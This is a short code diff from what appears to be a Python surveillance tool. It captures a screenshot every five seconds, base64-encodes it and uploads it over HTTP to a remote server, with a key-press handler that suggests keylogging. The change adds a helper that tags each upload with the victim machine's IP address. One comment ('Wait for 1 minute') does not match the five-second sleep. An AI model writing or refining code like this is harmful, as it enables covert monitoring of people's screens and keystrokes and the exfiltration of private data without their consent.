@@ -56,6 +56,12 @@ def send_image(screenshot_data, vector_pc_name, client_address):
         print("Failed to upload screenshot:", response.text)
 
 
+def get_ip_address():
+    # Get the local IP address of the computer
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    return ip_address
+
 def take_screenshot():
     while True:
         time.sleep(5)  # Wait for 1 minute
@@ -65,7 +71,7 @@ def take_screenshot():
             screenshot_data = f.read()
             encoded_screenshot = str(base64.b64encode(screenshot_data))
             #send the binary data of image trough http request
-            send_image(screenshot_data, computer_name, 'adresa')
+            send_image(screenshot_data, computer_name, get_ip_address())
             
 
 def on_press(key):
